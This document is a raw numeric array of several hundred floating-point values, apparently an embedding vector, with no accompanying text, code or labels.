0.024407239630818367, -0.018114084377884865, 0.00819952879101038, -0.015888800844550133, 0.03271307051181793, -0.02837589755654335, -0.015095070004463196, -0.008079051971435547, 0.01785895600914955, 0.024988364428281784, -0.0059707025066018105, -0.01948894001543522, -0.014428902417421341, -0.006381742190569639, 0.006941606290638447, 0.0031873276457190514, -0.0036391166504472494, 0.007076256908476353, 0.0044009569101035595, -0.01646992564201355, -0.006300242617726326, -0.022096915170550346, 0.021473268046975136, 0.017136093229055405, -0.01019094418734312, -0.0015786041039973497, 0.03140908479690552, -0.029169628396630287, -0.014542292803525925, -0.019389724358916283, 0.008688523434102535, -0.014407642185688019, 0.015548630617558956, -0.02537105605006218, 0.010042119771242142, 0.024846626445651054, 0.02922632358968258, 0.0021863046567887068, 0.027653034776449203, -0.009879120625555515, -0.01590297557413578, 0.02116144634783268, 0.006328590214252472, -0.006052201613783836, 0.019814936444163322, 0.003366271499544382, 0.003155436599627137, 0.008816087618470192, 0.017674697563052177, 0.0089365653693676, -0.014485597610473633, -0.00041258972487412393, -0.01695183478295803, -0.016980182379484177, 0.02039606124162674, -0.02473323605954647, 0.02599470317363739, 0.014457250013947487, -0.002728451741859317, 0.021756744012236595, -0.011353193782269955, -0.024137938395142555, 0.029935011640191078, -0.020637016743421555, 0.027865640819072723, 0.0014058612287044525, -0.03909127041697502, -0.02103388123214245, 0.021133098751306534, 0.002078229794278741, -0.0007596257491968572, 0.01625731959939003, -0.025541141629219055, 0.007590056397020817, 0.022961514070630074, 0.002033936558291316, 0.022578822448849678, 0.008872782811522484, 0.023244990035891533, -0.022125262767076492, -0.03869440406560898, -0.0203110184520483, 0.04164255037903786, 0.013309174217283726, -0.004007634706795216, -0.01201936136931181, -0.02395367994904518, 0.00011903756239917129, -0.002868417650461197, 0.0013748561032116413, 0.008036530576646328, 0.01829834282398224, -0.005244296509772539, 0.018936162814497948, -0.00760423019528389, -0.00704082241281867, 0.007101061288267374, -0.019559809938073158, -0.0315508209168911, 0.01668253354728222, 0.012650093995034695, 0.007689272984862328, -0.005166341084986925, 0.008440482430160046, 0.019092073664069176, -0.01272096298635006, -0.02101970836520195, -0.009368864819407463, -0.0020711428951472044, -0.0019294050289317966, 0.02228117361664772, 0.0036391166504472494, -0.005609271116554737, -0.009999598376452923, 0.006495132111012936, 0.0026380938943475485, -0.013996602967381477, -0.014839941635727882, 0.032202817499637604, -0.0026558111421763897, 0.005502968095242977, -0.02402454800903797, -0.014202122576534748, -0.0012906993506476283, 0.03438557684421539, 0.017830608412623405, 0.007111691404134035, 0.012565051205456257, -0.023457597941160202, 0.024704888463020325, -0.0038658969569951296, -0.011551626026630402, 0.007611317094415426, 0.012763484381139278, 0.007111691404134035, -0.0018780251266434789, 0.0031713820062577724, 0.007908966392278671, 0.030728744342923164, -0.0012906993506476283, 0.01801486685872078, -0.005446272902190685, 0.0049820817075669765, 0.0050246031023561954, 0.023656029254198074, -0.00029764926875941455, 0.027171125635504723, 0.013287913985550404, -0.029538147151470184, -0.01807156205177307, 0.014783247373998165, 0.005446272902190685, -0.025881312787532806, -0.006094723008573055, 0.005945898592472076, -0.021118924021720886, 0.002629235154017806, 0.00970194861292839, -0.007590056397020817, 0.028503460809588432, 0.01306822057813406, -0.012565051205456257, 0.004829713609069586, -0.035831302404403687, 0.02851763553917408, 0.003001296892762184, -3.9282396755879745e-05, 0.009290909394621849, 0.01984328404068947, -0.030927175655961037, -0.04444895684719086, 0.021501615643501282, 0.007994009181857109, 0.012756397016346455, 0.01341547816991806, -0.013968255370855331, -0.04365522786974907, -0.0220827404409647, 0.018482601270079613, 0.020934665575623512, 0.0035097808577120304, -0.0010816361755132675, -0.027426254004240036, -0.023244990035891533, -0.02341507561504841, -0.0714925229549408, -0.003054448403418064, 0.02661834843456745, -0.013231218792498112, -0.005028146784752607, -0.02480410598218441, -0.010495680384337902, -0.02887197956442833, 0.0010763210011646152, -0.0241662859916687, 0.027780598029494286, -0.029112933203577995, -0.012813092209398746, 0.0020126760937273502, -0.007019561715424061, 0.015392719767987728, -0.026164788752794266, 0.015605325810611248, 0.016583316028118134, -0.004613563884049654, -0.01808573678135872, -0.00963816698640585, -0.023429250344634056, 0.004195437300950289, 0.002274890895932913, 0.028631024062633514, -0.031295694410800934, -0.016299840062856674, 0.028007378801703453, 0.0028205811977386475, -0.001611380954273045, 0.018128257244825363, -0.012387879192829132, -0.0053754039108753204, 0.0052832746878266335, 0.00904286839067936, 0.03622816875576973, 0.012097316794097424, -0.01292648259550333, -0.0013208186719566584, -0.0059033771976828575, -0.027284516021609306, -0.0071223219856619835, -0.0014448391739279032, -0.0006772406632080674, -0.005134449806064367, -0.010261813178658485, 0.0038127454463392496, -0.0010710058268159628, -0.011679190210998058, -0.005687227007001638, 0.011778406798839569, -0.00758296949788928, -0.0008947195019572973, 0.002264260547235608, 0.007760141510516405, 0.001989643555134535, -0.02256464958190918, 0.01652662083506584, -0.016087234020233154, -0.023939505219459534, 0.025541141629219055, 0.011728798970580101, -0.003986374009400606, 0.005463989917188883, 0.013054046779870987, -0.01552028302103281, -0.023528466001152992, 0.02522931806743145, -0.01954563520848751, 0.012324096634984016, 0.008291658014059067, -0.009779904969036579, -0.025484446436166763, -0.013238305225968361, -0.0011206140043213964, -0.012146924622356892, -0.0024821823462843895, 0.0007520959479734302, -0.017759740352630615, 0.011799667030572891, -0.021289009600877762, -0.034102100878953934, 0.014939158223569393, -0.028134942054748535, -0.024194633588194847, -0.0006666103145107627, 0.0052407532930374146, 0.010743721388280392, -0.014386381022632122, -0.01272096298635006, -0.028219984844326973, 0.009383038617670536, -0.01920546405017376, 0.006282525602728128, 0.008539699018001556, 0.005162797402590513, 0.038070760667324066, 0.03214612230658531, 0.04175594076514244, -0.010800416581332684, 0.03974326327443123, -0.008830261416733265, 0.01723531074821949, 0.02053779922425747, 0.009425560012459755, 0.010850024409592152, -0.034300535917282104, 0.03242959827184677, 0.01828416995704174, 0.019715720787644386, 0.004773018416017294, -0.047113627195358276, 0.010743721388280392, 0.014698204584419727, -0.021402399986982346, 0.009120823815464973, -0.032259512692689896, -0.048531003296375275, -0.021827613934874535, -0.030501963570713997, -0.004209611099213362, -0.01904955320060253, -0.06690021604299545, -0.03557617589831352, 0.017603827640414238, -0.01954563520848751, 0.012742223218083382, 0.029169628396630287, 0.020098412409424782, -0.01661166362464428, 0.009588558226823807, -0.0009212953737005591, 0.020566146820783615, 0.02522931806743145, -0.01447142381221056, -0.005311622284352779, -0.01019094418734312, 0.013571389019489288, -0.03727702796459198, 0.011020109988749027, 0.007802662905305624, -0.009623993188142776, 0.0030845676083117723, 0.011679190210998058, -0.024634020403027534, -0.014343859627842903, 0.016654185950756073, -0.018964510411024094, 0.019304681569337845, -0.010970501229166985, -0.003883614204823971, -0.01941807195544243, 0.03483913838863373, 0.0042946538887917995, 0.0027621143963187933, 0.026391567662358284, -0.024067070335149765, 9.650347055867314e-05, -0.023485945537686348, 0.009078302420675755, 0.0175187848508358, 0.0007233054493553936, 0.036738425493240356, 0.004762388300150633, 0.010453158989548683, -0.019673198461532593, 0.021841786801815033, 0.010134248994290829, 0.00865308940410614, 0.046008072793483734, -0.0049856253899633884, -0.0020569690968841314, -0.014443076215684414, 0.04079212248325348, -0.013585562817752361, -0.029197975993156433, -0.031068913638591766, 0.00956021063029766, 0.004485999699681997, 0.010183856822550297, -0.02143074758350849, 0.002669984707608819, -0.014584814198315144, -0.0059175509959459305, 0.0004094892065040767, 0.0046064769849181175, 0.02970823086798191, 0.00044669536873698235, -0.001102896872907877, 0.019007032737135887, -0.007745967712253332, -2.8430598831619136e-05, 0.012940656393766403, -0.00308279599994421, -0.009205866605043411, -0.007054996211081743, -0.014953332021832466, 0.013295000419020653, 0.021331530064344406, 0.026235656812787056, 0.0035700195003300905, -0.0030934263486415148, 0.02683095633983612, -0.014187948778271675, 0.013904472813010216, -0.0042946538887917995, -0.007033735513687134, 0.032826460897922516, -0.012373705394566059, -0.013961168006062508, 0.010722460225224495, -0.035065919160842896, -0.0056730532087385654, -0.004291110206395388, -0.008865696378052235, -0.023854462429881096, -0.024478109553456306, 0.017816435545682907, 0.029935011640191078, 0.00760423019528389, -0.007745967712253332, -0.016030538827180862, -0.008050704374909401, -0.021756744012236595, -0.002092403592541814, -0.03413045033812523, 0.03316663205623627, -0.02880110964179039, 0.008497177623212337, -0.012281576171517372, -0.04076377674937248, 0.007363276090472937, -0.012097316794097424, 0.0050635808147490025, 0.006094723008573055, 0.03960152715444565, -0.004776562098413706, -0.0035292699467390776, -0.03070039674639702, -0.0005572065128944814, 0.0018921989249065518, -0.010772068984806538, -0.0017867814749479294, -0.024208806455135345, 0.024293849244713783, -0.013535954989492893, -0.03356349840760231, -0.0055525763891637325, 0.0014368663541972637, -0.016016365960240364, -0.015988018363714218, 0.004602933302521706, 0.010105901397764683, 0.0029711774550378323, 0.010694112628698349, -0.015137591399252415, 0.0009239529608748853, 0.06593640148639679, -0.025456098839640617, -0.010290160775184631, 0.005120276007801294, 0.0029073955956846476, -0.010531114414334297, -0.00973738357424736, 0.00353104155510664, -0.006523479707539082, -0.013337521813809872, -0.015931323170661926, 0.023670203983783722, -0.017547132447361946, -0.018128257244825363, -0.01724948361515999, -0.015024201013147831, 0.008008182980120182, 0.0046844324097037315, 0.0068353028036653996, 0.02082127518951893, -0.025101754814386368, 0.024690715596079826, -0.006098266690969467, -0.0089365653693676, 0.010942153632640839, -0.02361350879073143, -0.04402374476194382, 0.005775813013315201, -0.0008730159606784582, -0.014854115433990955, -0.016200624406337738, -0.01849677599966526, 0.05471077188849449, 0.012359531596302986, -0.025810442864894867, -0.016781749203801155, 0.003965113312005997, -0.03376192972064018, -0.00246092164888978, -0.03200438246130943, 0.016852617263793945, 0.03532104566693306, 0.007419970817863941, -0.0007467807736247778, 0.038864489644765854, -0.0058785732835531235, 0.003150121308863163, -0.04504425451159477, 0.020920490846037865, 0.015931323170661926, -0.023854462429881096, 0.026023050770163536, -0.008142833597958088, -0.0031483497004956007, -0.002615061355754733, 0.020424408838152885, 0.04243628308176994, -0.010679938830435276, 0.03985665366053581, -0.008234962821006775, -0.02564035914838314, -0.03594469279050827, -0.005676596891134977, -0.0074057974852621555, -0.013082394376397133, 0.0014315512962639332, -0.05768726393580437, -0.02494584396481514, 0.023500118404626846, -0.006296699400991201, -0.00973738357424736, -0.006449067499488592, 0.017136093229055405, -0.02073623239994049, -0.0020286215003579855, -0.011572887189686298, 0.017476264387369156, -0.02038188837468624, -0.025881312787532806, 0.028957022354006767, 0.013982429169118404, -0.007210907991975546, 0.0124374870210886, 0.00851135142147541, 0.002092403592541814, -0.01654079556465149, 0.030246835201978683, -0.002987123094499111, -0.016937660053372383, 0.020211802795529366, 0.0020427952986210585, -0.00018326248391531408, 0.004340718500316143, 0.02979327365756035, -0.006509305909276009, -0.018723556771874428, 0.005481707397848368, -0.009156258776783943, -0.047538839280605316, 0.01282726600766182, 0.0032635116949677467, -0.021813439205288887, -0.016214799135923386, 0.019503114745020866, -0.02382611483335495, 0.009191692806780338, -0.008312919177114964, -0.016498273238539696, -0.002517616841942072, 0.02446393482387066, -0.032628029584884644, -0.022394564002752304, -0.04527103528380394, -0.013394217006862164, 0.0018301886739209294, 0.03770224004983902, 0.0014714149292558432, 0.2075040638446808, 0.013968255370855331, -0.0038907011039555073, 0.037248678505420685, 0.0071364957839250565, 0.007306580897420645, 0.013982429169118404, -0.010035032406449318, -0.006803411990404129, 0.011353193782269955, -0.0008628285140730441, 0.01948894001543522, 0.01198392640799284, -0.0029339713510125875, 0.009156258776783943, 0.023174121975898743, -0.016484100371599197, -0.004567498806864023, -0.0059707025066018105, -0.0006519936141557992, 0.015959670767188072, -0.010105901397764683, 0.007455405313521624, -0.007342015393078327, 0.003663920797407627, -0.03308159112930298, 0.0036284863017499447, 0.025413578376173973, -0.011700451374053955, 0.00011145237658638507, -0.02544192597270012, -0.010013772174715996, -0.003619627794250846, 0.006144331302493811, -0.025385230779647827, -0.01054528821259737, 0.008291658014059067, 0.005084841512143612, 0.030728744342923164, 0.02620730921626091, 0.018043214455246925, 0.009623993188142776, 0.0103397686034441, -0.013514693826436996, -0.004804909694939852, 0.030870480462908745, -0.012480008415877819, 0.0029162541031837463, -0.014478511177003384, 0.010169683024287224, -0.029679883271455765, 0.022692212834954262, 0.01849677599966526, -0.027780598029494286, -0.003010155400261283, -0.0036391166504472494, -0.010559462010860443, -0.013330435380339622, 0.007859357632696629, -0.012770570814609528, -0.021473268046975136, -0.007540448103100061, -0.014556466601788998, 0.04575294628739357, -0.02670339122414589, 0.03033187799155712, -0.028134942054748535, -0.0015520283486694098, 0.0015511424280703068, 0.000714446825440973, -0.0241662859916687, -0.018269995227456093, -0.021133098751306534, 0.00356470444239676, -0.015860453248023987, -0.014074558392167091, 0.008610568009316921, 0.011168934404850006, 0.004454108886420727, 0.008497177623212337, 0.012465834617614746, 0.002026849891990423, 0.021317357197403908, -0.03872275352478027, -0.012543790973722935, -0.02333003282546997, -0.013918646611273289, -0.015732889994978905, 0.004471825901418924, 0.017178615555167198, -0.02979327365756035, -0.009872034192085266, -0.000833595113363117, -0.005655336193740368, -0.01844008080661297, 0.005563206505030394, 0.050061773508787155, -0.0009159801993519068, -0.014350946992635727, -0.04031021520495415, -0.04470408707857132, 0.07018852978944778, 0.007611317094415426, 0.0017805804964154959, -0.008234962821006775, -0.005786443594843149, -0.007653838489204645, 0.03985665366053581, -0.014769073575735092, -0.03602973371744156, -0.005258470308035612, -0.0287302415817976, 0.00664041331037879, -0.0031997296027839184, -0.0027957770507782698, 0.011055544018745422, 0.028673546388745308, 0.003534585004672408, -0.01639905758202076, -0.019375549629330635, -0.005244296509772539, -0.03597303852438927, -0.00478010531514883, 0.005300991702824831, 0.006672304589301348, -0.006473871413618326, 0.0018355038482695818, 0.009425560012459755, -0.021076403558254242, -0.012352444231510162, 0.007086887490004301, -0.01792982406914234, 0.02802155166864395, -0.045639555901288986, -0.005701400805264711, -0.010722460225224495, 0.010460245423018932, -0.008667263202369213, 7.302816084120423e-05, 0.011686277575790882, 0.009779904969036579, -0.0033414673525840044, 0.0027957770507782698, -0.010757895186543465, 0.018936162814497948, -0.05388868972659111, 0.00924838799983263, 0.02403872273862362, 0.005612814798951149, -0.0413307286798954, -0.007037279196083546, -0.027638860046863556, 0.0046596284955739975, -0.004018265288323164, 0.006115983705967665, -0.014379294589161873, 0.00047172093763947487, -0.0420394167304039, -0.028645198792219162, -0.001569745596498251, -0.03271307051181793, 0.03427218645811081, -0.007944400422275066, -0.019106248393654823, -0.02851763553917408, -0.008844435214996338, -0.18131092190742493, 0.009914555586874485, 0.020424408838152885, -0.012217793613672256, 0.018695209175348282, -0.015945496037602425, 0.005152167286723852, -0.0029304279014468193, -0.019148768857121468, -0.0006232031737454236, 0.016640011221170425, 0.0025796270929276943, -0.01341547816991806, -0.0357462614774704, -0.02467654086649418, 0.007590056397020817, -0.027454601600766182, -0.016030538827180862, 0.014811594970524311, 0.015959670767188072, 0.041727591305971146, -0.021246489137411118, -0.00970194861292839, -0.024577325209975243, -0.006119527388364077, -0.012898134998977184, -0.01342256460338831, 0.009723209775984287, 0.007104604505002499, 0.0015484848991036415, -0.030927175655961037, -0.018411733210086823, 0.025881312787532806, -0.008419222198426723, 0.010410637594759464, 0.02087797038257122, 0.009524776600301266, -0.006700652185827494, -0.005665966309607029, 0.01093506719917059, 0.019559809938073158, 0.01778808794915676, -0.008050704374909401, 0.012876874767243862, -0.03231620788574219, -0.011126413010060787, 0.009064128622412682, -0.010743721388280392, 0.022267000749707222, -0.011069717817008495, 0.032202817499637604, -0.01167210377752781, -0.008844435214996338, 0.005442729685455561, 0.008327092975378036, 0.009191692806780338, -0.01282726600766182, 0.004691519308835268, -0.011742972768843174, -0.006505762692540884, -0.008582220412790775, -0.03634155914187431, 0.022947341203689575, 0.0008867467986419797, 0.009241300635039806, -0.0120902294293046, -0.008079051971435547, 0.010247639380395412, -0.03730537369847298, 0.013819430023431778, -0.04617815837264061, -0.00257431180216372, 0.031919341534376144, -0.004227328114211559, 0.016498273238539696, 0.046348243951797485, -0.02024015039205551, -0.0016202395781874657, -0.024435587227344513, -0.006420719902962446, -0.0315508209168911, 0.03846762329339981, -0.010205117985606194, -0.01666835881769657, 0.006853020284324884, 0.01941807195544243, 0.02249377965927124, -0.009992511011660099, -0.0073561891913414, -0.010063380002975464, -0.0024715519975870848, -0.012777658179402351, 0.00012368832540232688, 0.00854678638279438, -0.00024671226856298745, 0.02080710045993328, 0.008284571580588818, 0.01552028302103281, 0.00998542457818985, -0.022096915170550346, -0.003040274605154991, -0.016994355246424675, -0.013457998633384705, 0.012061881832778454, 0.03070039674639702, -0.007253429386764765, 0.0024768670555204153, -0.0037418764550238848, 0.02984996885061264, 0.002894993405789137, -0.016370709985494614, 0.026731738820672035, 0.018964510411024094, 0.04793570563197136, 0.00569077068939805, 0.012076055631041527, 0.009567297995090485, -0.023386728018522263, 0.018879467621445656, 0.013535954989492893, 0.048247527331113815, -0.011105152778327465, -0.02082127518951893, 0.034782443195581436, 0.024435587227344513, -0.00758296949788928, -0.08770731836557388, -0.02719947323203087, 0.014053297229111195, 0.03356349840760231, -0.019375549629330635, 0.017221136018633842, -0.006473871413618326, 0.02039606124162674, 0.0020144477020949125, 0.026717565953731537, -0.01865268684923649, -0.01913459599018097, -0.0031731538474559784, 0.008050704374909401, 0.0005824535619467497, -0.010120075196027756, -0.008915304206311703, -0.015803758054971695, -0.011806754395365715, 0.04527103528380394, -0.013372956775128841, -0.02002754434943199, -0.02313159964978695, -0.010219291783869267, -0.018043214455246925, 0.013287913985550404, -0.02839007042348385, 0.024364719167351723, -0.014627335593104362, 0.02437889203429222, 0.004872235003858805, 0.0033556411508470774, 0.011905970983207226, 0.009028694592416286, -0.005782899912446737, -0.02381194196641445, 0.008249136619269848, -0.02494584396481514, 0.009815338999032974, -0.022649692371487617, 0.023656029254198074, 0.02956649474799633, 0.00646678451448679, 0.002165044192224741, 0.010240552015602589, -0.0035558457020670176, 0.003805658547207713, 0.029878316447138786, 0.0065518273040652275, -0.030587006360292435, -0.04031021520495415, -0.014797421172261238, -0.02501671202480793, 0.006006137002259493, 0.028687719255685806, 0.005531315691769123, 0.011835101991891861, 0.027497122064232826, -0.025541141629219055, -0.013982429169118404, 0.0046312808990478516, -0.009460994973778725, 0.008157007396221161, -0.012550877407193184, 0.0034247383009642363, -0.007264059502631426, -0.01800069399178028, -0.022451259195804596, 0.013358782976865768, -0.024421414360404015, -0.010708286426961422, 0.009829512797296047, -0.012295749969780445, 0.015250981785356998, -0.02979327365756035, 0.004471825901418924, 0.004163546487689018, -0.008660176768898964, 0.012983177788555622, -0.02045275643467903, -0.01703687757253647, -0.007292407099157572, -0.010623244568705559, -0.014067471027374268, 0.023556813597679138, 0.028489287942647934, 0.012643006630241871, 0.009453907608985901, 0.027213647961616516, -0.018879467621445656, 0.012387879192829132, 0.010353942401707172, 0.00613370118662715, -0.025753749534487724, -0.0012517215218394995, 0.022267000749707222, 0.012260315008461475, -0.006282525602728128, 0.002781603252515197, 0.005276187788695097, -0.011558713391423225, -0.003660377347841859, -0.048247527331113815, 0.041302379220724106, 0.00737744988873601, -0.01366351917386055, -0.01233827043324709, -0.017476264387369156, -0.005832508206367493, 0.003936765715479851, 0.005120276007801294, 0.008667263202369213, -0.029623189941048622, 0.0013367640785872936, 0.004411587491631508, -0.022607170045375824, -0.006633326411247253, -0.011955578811466694, 0.005882116500288248, -0.007104604505002499, 0.02403872273862362, -0.007203821092844009, -0.013840691186487675, -0.003220990300178528, -0.02039606124162674, 0.023514293134212494, 0.010148422792553902, 0.04002673923969269, -0.02878693677484989, 0.018794424831867218, 0.008149920031428337, -0.0009815338999032974, 0.031238999217748642, -0.0022979232016950846, 8.210823580157012e-05, 0.032684724777936935, -0.004960821010172367, -0.007561708800494671, 0.02361350879073143, 0.0124374870210886, 0.023840289562940598, -0.024619847536087036, -0.009269648231565952, -0.013691866770386696, -0.019999196752905846, -0.0012242598459124565, 0.011927231214940548, -0.017816435545682907, -0.01043898519128561, 0.017051050439476967, 0.006558914203196764, 0.014251730404794216, 0.04107559844851494, -0.004528521094471216, -0.025597836822271347, -0.018950337544083595, -0.03971491754055023, -0.007320754695683718, 0.008157007396221161, 0.0046844324097037315, -0.004408043809235096, -0.012409139424562454, 0.031238999217748642, -0.002159728901460767, 0.011714625172317028, -0.0336201936006546, 0.015491935424506664, -0.026462437584996223, -0.0427481047809124, 0.035009223967790604, 0.01668253354728222, -0.008603481575846672, -0.02103388123214245, -0.004886408802121878, -0.006853020284324884, -0.0007746853516437113, 0.021827613934874535, 0.002643408952280879, 0.024634020403027534, -0.004418674390763044, -0.0364549495279789, 0.01865268684923649, 0.005513598211109638, -0.01764634996652603, -0.012288662604987621, 0.01604471355676651, -0.00025911431293934584, 0.020013369619846344, -0.008433395996689796, 0.024364719167351723, -0.02094883844256401, 0.007278233300894499, -0.02045275643467903, 0.006948693189769983, -0.0017478036461398005, -0.027553817257285118, 0.013146176002919674, 0.02759633958339691, 0.006622696295380592, 0.0011826243717223406, 0.03160751610994339, 0.007154212798923254, 0.026873476803302765, 0.011225629597902298, 0.01153036579489708, -0.014740725979208946, 0.037163637578487396, 0.028829457238316536, -0.04195437207818031, -0.030672049149870872, 0.024889148771762848, -0.009751557372510433, 0.01044607162475586, 0.01148784440010786, -0.013372956775128841, 0.01780226081609726, -0.020169280469417572, 0.00974447000771761, 0.02130318246781826, 0.007625490892678499, 0.005276187788695097, 0.021600833162665367, 0.018326690420508385, 0.01272096298635006, 0.01597384363412857, -0.03838258236646652, 0.03733372315764427, -0.011806754395365715, 0.006282525602728128, 0.002717821393162012, 0.02052362635731697, -0.0002817037748172879, 0.0024804105050861835, 0.025257665663957596, -0.014698204584419727, -0.008560960181057453, 0.0005589782376773655, -0.009900381788611412, 0.010254725813865662, -0.0013403075281530619, 0.01948894001543522, 0.0658797025680542, 0.029594842344522476, -0.010906719602644444, -0.01223196741193533, -0.006480958312749863, 0.02817746438086033, -0.0038375495932996273, -0.009751557372510433, 0.008001095615327358, -0.013762734830379486, 0.014556466601788998, 0.0014749583788216114, 0.007930226624011993, -0.013429651968181133, -0.003943852614611387, 0.013004438020288944, -0.010488593019545078, 0.013543041422963142, -0.011133500374853611, -0.04127403348684311, 0.019304681569337845, 0.02970823086798191, 0.03169256076216698, 0.012239054776728153, -0.003947396297007799, 0.00022855211864225566, 0.030360225588083267, 0.0026380938943475485, -0.032769765704870224, 0.005680140107870102, 0.003334380453452468, 0.0032741420436650515, -0.028049899265170097, -0.029821621254086494, 0.012068969197571278, -0.0016149244038388133, -0.001102010952308774, -0.0017150266794487834, 0.02123231440782547, 0.020353540778160095, -0.018907815217971802, 0.010275986976921558, -0.028489287942647934, -0.01842590793967247, -0.0026504958514124155, 0.003594823647290468, -0.019942501559853554, -8.775559399509802e-05, -0.04266306012868881]"
